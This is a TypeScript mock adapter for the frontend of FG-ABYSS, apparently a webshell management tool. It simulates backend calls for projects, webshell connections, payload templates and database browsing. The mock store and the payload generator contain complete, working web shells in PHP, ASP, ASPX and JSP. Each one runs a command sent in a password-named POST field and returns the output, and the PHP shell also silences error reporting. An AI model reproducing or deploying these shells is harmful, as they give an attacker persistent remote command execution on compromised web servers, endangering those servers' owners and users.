/**
 * Tauri Mock 适配层
 * 
 * 用于在 Tauri v2 后端尚未实现时，模拟后端 API 调用
 * 所有 Mock 数据都基于源项目 (FG-ABYSS) 的 Go 后端逻辑设计
 * 
 * @author FG-ABYSS Team
 * @version 1.0.0
 */

// ==================== 类型定义 ====================

/**
 * 系统状态信息
 * 对应源项目中的 SystemStatus 结构体
 */
export interface SystemStatus {
  memoryUsage: string      // 内存使用情况 (如："8.5 GB / 16 GB")
  processId: string        // 进程 ID
  cpuUsage: string         // CPU 使用率 (如："25%")
  uptime: string           // 运行时间 (如："2 小时 15 分钟")
}

/**
 * WebShell 实体
 * 对应源项目中的 WebShell 实体
 */
export interface WebShell {
  id: string
  projectId: string
  url: string
  payload: string
  cryption: string
  encoding: string
  proxyType: string
  remark: string
  status: string
  createdAt?: string
  updatedAt?: string
}

/**
 * 项目实体
 * 对应源项目中的 Project 实体
 */
export interface Project {
  id: string
  name: string
  description?: string
  createdAt?: string
  updatedAt?: string
}

/**
 * Payload 生成参数
 * 对应源项目中的 GenerateRequest
 */
export interface GeneratePayloadRequest {
  type: string
  function: string
  password: string
  encoder: string
  encryption_key?: string
  obfuscation_level: string
  output_filename?: string
  template_name?: string
}

/**
 * Payload 生成结果
 * 对应源项目中的 GenerateResponse
 */
export interface GeneratePayloadResponse {
  success: boolean
  content: string
  filename: string
  size: number
  message?: string
}

/**
 * 模板信息
 * 对应源项目中的 TemplateInfo
 */
export interface TemplateInfo {
  name: string
  type: string
  function: string
  description: string
  isCustom?: boolean
}

/**
 * 事件监听器取消函数
 */
export type UnlistenFn = () => void

// ==================== Mock 数据存储 ====================

/**
 * 模拟的内存数据存储
 * 用于在会话期间保存创建的数据
 */
export const mockStore = {
  projects: [] as Project[],
  webshells: [] as WebShell[],
  payloads: [
    // 预置一些示例 Payload 数据
    {
      id: 1,
      name: 'example_php_basic.php',
      type: 'php',
      function: 'basic',
      encoder: 'none',
      obfuscationLevel: 'low',
      createdAt: new Date().toISOString(),
      size: 512,
      content: `<?php
// Example PHP Payload by FG-ABYSS
@error_reporting(0);
@set_time_limit(0);

if (isset($_POST['password'])) {
    $cmd = $_POST['password'];
    echo "<pre>";
    system($cmd);
    echo "</pre>";
}
?>`
    },
    {
      id: 2,
      name: 'example_asp_basic.asp',
      type: 'asp',
      function: 'basic',
      encoder: 'none',
      obfuscationLevel: 'low',
      createdAt: new Date().toISOString(),
      size: 380,
      content: `<%
' Example ASP Payload by FG-ABYSS
Dim cmd
cmd = Request.Form("password")
If cmd <> "" Then
    Dim shell
    Set shell = Server.CreateObject("WScript.Shell")
    Dim exec
    Set exec = shell.Exec(cmd)
    Response.Write "<pre>" & exec.StdOut.ReadAll() & "</pre>"
End If
%>`
    }
  ] as any[],
  templates: [] as TemplateInfo[],
  settings: new Map<string, any>(),
  systemStatus: {
    memoryUsage: '8.5 GB / 16 GB',
    processId: '12345',
    cpuUsage: '25%',
    uptime: '2 小时 15 分钟'
  } as SystemStatus
}

// 初始化一些 Mock 数据
const initializeMockData = () => {
  // 初始化默认项目
  if (mockStore.projects.length === 0) {
    mockStore.projects = [
      {
        id: 'proj_001',
        name: '演示项目',
        description: '这是一个演示项目',
        createdAt: new Date().toISOString(),
        updatedAt: new Date().toISOString()
      }
    ]
  }

  // 初始化默认模板
  if (mockStore.templates.length === 0) {
    mockStore.templates = [
      { name: 'PHP Basic', type: 'php', function: 'basic', description: 'PHP 基础命令执行' },
      { name: 'PHP Full', type: 'php', function: 'full', description: 'PHP 完整功能' },
      { name: 'ASP Basic', type: 'asp', function: 'basic', description: 'ASP 基础命令执行' },
      { name: 'ASPX Basic', type: 'aspx', function: 'basic', description: 'ASPX 基础命令执行' },
      { name: 'JSP Basic', type: 'jsp', function: 'basic', description: 'JSP 基础命令执行' }
    ]
  }
}

// 立即初始化
initializeMockData()

// ==================== 事件系统 ====================

/**
 * 事件监听器映射表
 */
const eventListeners = new Map<string, Set<Function>>()

/**
 * 模拟事件监听
 * 
 * @param event 事件名称
 * @param callback 回调函数
 * @returns 取消监听的函数
 */
export async function listen(event: string, callback: Function): Promise<UnlistenFn> {
  console.log('[Mock Adapter] 监听事件:', event)
  
  if (!eventListeners.has(event)) {
    eventListeners.set(event, new Set())
  }
  eventListeners.get(event)!.add(callback)
  
  // 返回取消监听的函数
  return () => {
    const listeners = eventListeners.get(event)
    if (listeners) {
      listeners.delete(callback)
      if (listeners.size === 0) {
        eventListeners.delete(event)
      }
    }
    console.log('[Mock Adapter] 取消监听事件:', event)
  }
}

/**
 * 模拟事件触发
 * 
 * @param event 事件名称
 * @param payload 事件数据
 */
export async function emitEvent(event: string, payload?: any): Promise<void> {
  console.log('[Mock Adapter] 触发事件:', event, payload)
  
  const listeners = eventListeners.get(event)
  if (listeners) {
    listeners.forEach(callback => {
      try {
        callback(payload)
      } catch (error) {
        console.error('[Mock Adapter] 事件回调执行失败:', error)
      }
    })
  }
}

// ==================== 核心 Invoke 函数 ====================

/**
 * 模拟 Tauri 的 invoke 函数
 * 
 * @param command 命令名称 (蛇形命名 snake_case)
 * @param args 参数对象
 * @returns Promise<any> 返回结果
 */
export async function invoke(command: string, args?: any): Promise<any> {
  console.log('[Mock Adapter] 调用命令:', command, args)
  
  // 模拟网络延迟 (100ms-500ms 随机)
  const delay = Math.floor(Math.random() * 400) + 100
  await new Promise(resolve => setTimeout(resolve, delay))
  
  // 命令分发器
  switch (command) {
    // ==================== 系统相关命令 ====================
    
    case 'get_system_status':
      return mockStore.systemStatus
    
    case 'ping':
      return 'pong'
    
    // ==================== 项目相关命令 ====================
    
    case 'get_projects':
      return mockStore.projects
    
    case 'create_project':
      const newProject: Project = {
        id: `proj_${Date.now()}`,
        name: args?.name || '未命名项目',
        description: args?.description || '',
        createdAt: new Date().toISOString(),
        updatedAt: new Date().toISOString()
      }
      mockStore.projects.push(newProject)
      return { success: true, project: newProject }
    
    case 'delete_project':
      const projectIndex = mockStore.projects.findIndex(p => p.id === args?.projectId)
      if (projectIndex !== -1) {
        mockStore.projects.splice(projectIndex, 1)
        return { success: true }
      }
      throw new Error('项目不存在')
    
    case 'get_deleted_projects':
      // 模拟已删除项目列表
      return []
    
    case 'recover_project':
      // 模拟恢复项目
      return { success: true }
    
    case 'get_deleted_webshells':
      // 模拟已删除 WebShell 列表
      return []
    
    case 'recover_webshell':
      // 模拟恢复 WebShell
      return { success: true }
    
    // ==================== WebShell 相关命令 ====================
    
    case 'get_webshells':
      const filteredWebshells = args?.projectId
        ? mockStore.webshells.filter(ws => ws.projectId === args.projectId)
        : mockStore.webshells
      return filteredWebshells
    
    case 'create_webshell':
      if (!args?.projectId) {
        throw new Error('未选择项目')
      }
      if (!args?.url) {
        throw new Error('URL 不能为空')
      }
      
      const newWebshell: WebShell = {
        id: `ws_${Date.now()}`,
        projectId: args.projectId,
        url: args.url,
        payload: args.payload || 'php',
        cryption: args.cryption || 'none',
        encoding: args.encoding || 'UTF-8',
        proxyType: args.proxyType || 'none',
        remark: args.remark || '',
        status: args.status || 'active',
        createdAt: new Date().toISOString(),
        updatedAt: new Date().toISOString()
      }
      mockStore.webshells.push(newWebshell)
      
      // 触发 WebShell 创建事件
      await emitEvent('webshell-created', newWebshell)
      
      return { success: true, webshell: newWebshell }
    
    case 'delete_webshell':
      const wsIndex = mockStore.webshells.findIndex(ws => ws.id === args?.webshellId)
      if (wsIndex !== -1) {
        mockStore.webshells.splice(wsIndex, 1)
        return { success: true }
      }
      throw new Error('WebShell 不存在')
    
    case 'connect_webshell':
      // 模拟连接 WebShell
      return {
        success: true,
        connectionId: `conn_${Date.now()}`,
        message: '连接成功'
      }
    
    // ==================== Payload 相关命令 ====================
    
    case 'generate_payload':
      const payloadReq = args as GeneratePayloadRequest
      if (!payloadReq?.type) {
        throw new Error('缺少脚本类型参数')
      }
      
      // 生成模拟的 Payload 内容
      const mockContent = generateMockPayloadContent(payloadReq)
      const filename = payloadReq.output_filename || `shell_${Date.now()}.${payloadReq.type}`
      
      const payloadResponse: GeneratePayloadResponse = {
        success: true,
        content: mockContent,
        filename: filename,
        size: mockContent.length
      }
      
      // 保存到 payloads 列表
      mockStore.payloads.push({
        id: mockStore.payloads.length + 1,
        name: filename,
        type: payloadReq.type,
        function: payloadReq.function || 'basic',
        encoder: payloadReq.encoder || 'none',
        obfuscationLevel: payloadReq.obfuscation_level || 'low',
        createdAt: new Date().toISOString(),
        size: mockContent.length,
        content: mockContent
      })
      
      return payloadResponse
    
    case 'get_payloads':
      // 返回已生成的 Payload 列表
      return {
        success: true,
        payloads: mockStore.payloads,
        total: mockStore.payloads.length
      }
    
    case 'get_templates':
      return mockStore.templates
    
    case 'add_template':
      const newTemplate: TemplateInfo = {
        name: args?.name || `Template_${Date.now()}`,
        type: args?.type || 'php',
        function: args?.function || 'basic',
        description: '自定义模板',
        isCustom: true
      }
      mockStore.templates.push(newTemplate)
      return { success: true, template: newTemplate }
    
    case 'delete_template':
      const tplIndex = mockStore.templates.findIndex(t => t.name === args?.templateName)
      if (tplIndex !== -1) {
        mockStore.templates.splice(tplIndex, 1)
        return { success: true }
      }
      throw new Error('模板不存在')
    
    case 'delete_all_templates':
      mockStore.templates = []
      return { success: true }
    
    // ==================== 设置相关命令 ====================
    
    case 'get_settings':
      return Object.fromEntries(mockStore.settings)
    
    case 'save_setting':
      mockStore.settings.set(args?.key, args?.value)
      return { success: true }
    
    case 'get_default_settings':
      return {
        theme: 'system',
        language: 'zh-CN',
        accentColor: '#3b82f6',
        fontFamily: 'system-ui',
        fontSize: '14px'
      }
    
    // ==================== 文件相关命令 ====================
    
    case 'open_file_dialog':
      // 模拟文件选择
      return {
        success: true,
        path: '/mock/path/selected_file.txt'
      }
    
    case 'read_file':
      return {
        content: 'Mock file content'
      }
    
    case 'write_file':
      return { success: true }
    
    // ==================== 数据库相关命令 ====================
    
    case 'database_connect':
      return {
        success: true,
        connectionId: `conn_${Date.now()}`,
        message: '数据库连接成功（Mock）'
      }
    
    case 'database_disconnect':
      return { success: true }
    
    case 'database_test_connection':
      return {
        success: true,
        message: '连接测试成功（Mock）'
      }
    
    case 'database_execute_query':
      return {
        success: true,
        columns: ['id', 'name', 'created_at'],
        rows: [
          [1, '测试数据 1', '2024-01-01'],
          [2, '测试数据 2', '2024-01-02'],
          [3, '测试数据 3', '2024-01-03']
        ],
        rowCount: 3
      }
    
    case 'database_get_tables':
      return {
        success: true,
        tables: [
          { name: 'users', schema: 'public', rows: 1000, size: '1.2 MB' },
          { name: 'posts', schema: 'public', rows: 5000, size: '3.5 MB' },
          { name: 'comments', schema: 'public', rows: 10000, size: '2.1 MB' }
        ]
      }
    
    case 'database_get_table_columns':
      return {
        success: true,
        columns: [
          { name: 'id', type: 'INTEGER', nullable: false, primary: true },
          { name: 'name', type: 'VARCHAR(255)', nullable: false, primary: false },
          { name: 'email', type: 'VARCHAR(255)', nullable: true, primary: false },
          { name: 'created_at', type: 'TIMESTAMP', nullable: false, primary: false }
        ]
      }
    
    // ==================== 其他命令 ====================
    
    case 'greet':
      return `Hello, ${args?.name || 'Guest'}! This is a mock response from Tauri Mock Adapter.`
    
    default:
      console.warn('[Mock Adapter] 未实现的命令:', command)
      // 对于未实现的命令，返回一个通用的成功响应
      return { 
        success: true, 
        message: `Mock response for command: ${command}`,
        data: null
      }
  }
}

// ==================== 辅助函数 ====================

/**
 * 生成模拟的 Payload 内容
 * 
 * @param req Payload 生成请求
 * @returns 生成的 Payload 代码
 */
function generateMockPayloadContent(req: GeneratePayloadRequest): string {
  const { type, password, encoder, obfuscation_level } = req
  
  const payloads: Record<string, string> = {
    php: `<?php
// Payload generated by FG-ABYSS Mock Adapter
// Type: PHP, Password: ${password}, Encoder: ${encoder}, Obfuscation: ${obfuscation_level}

@error_reporting(0);
@set_time_limit(0);

if (isset($_POST['${password}'])) {
    $cmd = $_POST['${password}'];
    echo "<pre>";
    system($cmd);
    echo "</pre>";
}
?>`,
    
    asp: `<%
' Payload generated by FG-ABYSS Mock Adapter
' Type: ASP, Password: ${password}

Dim cmd
cmd = Request.Form("${password}")
If cmd <> "" Then
    Dim shell
    Set shell = Server.CreateObject("WScript.Shell")
    Dim exec
    Set exec = shell.Exec(cmd)
    Response.Write "<pre>" & exec.StdOut.ReadAll() & "</pre>"
End If
%>`,
    
    aspx: `<%@ Page Language="C#" %>
<%
// Payload generated by FG-ABYSS Mock Adapter
// Type: ASPX, Password: ${password}

if (Request.Form["${password}"] != null) {
    string cmd = Request.Form["${password}"];
    System.Diagnostics.Process p = new System.Diagnostics.Process();
    p.StartInfo.FileName = "cmd.exe";
    p.StartInfo.Arguments = "/c " + cmd;
    p.StartInfo.RedirectStandardOutput = true;
    p.StartInfo.UseShellExecute = false;
    p.Start();
    Response.Write("<pre>" + p.StandardOutput.ReadToEnd() + "</pre>");
}
%>`,
    
    jsp: `<%@ page import="java.util.*,java.io.*" %>
<%
// Payload generated by FG-ABYSS Mock Adapter
// Type: JSP, Password: ${password}

String cmd = request.getParameter("${password}");
if (cmd != null) {
    Process p = Runtime.getRuntime().exec(cmd);
    BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
    String line;
    out.println("<pre>");
    while ((line = br.readLine()) != null) {
        out.println(line);
    }
    out.println("</pre>");
}
%>`
  }
  
  return payloads[type] || `<!-- Unknown payload type: ${type} -->`
}

/**
 * 模拟延迟的工具函数
 * 
 * @param ms 延迟毫秒数
 */
export function delay(ms: number = 100): Promise<void> {
  return new Promise(resolve => setTimeout(resolve, ms))
}

/**
 * 获取 Mock 存储数据（用于调试）
 */
export function getMockStore() {
  return { ...mockStore }
}

/**
 * 清空 Mock 数据（用于测试）
 */
export function clearMockStore() {
  mockStore.projects = []
  mockStore.webshells = []
  mockStore.payloads = []
  mockStore.templates = []
  mockStore.settings.clear()
  initializeMockData()
  console.log('[Mock Adapter] Mock 数据已清空并重新初始化')
}

// ==================== 导出 ====================

export default {
  invoke,
  listen,
  emitEvent,
  delay,
  getMockStore,
  clearMockStore
}
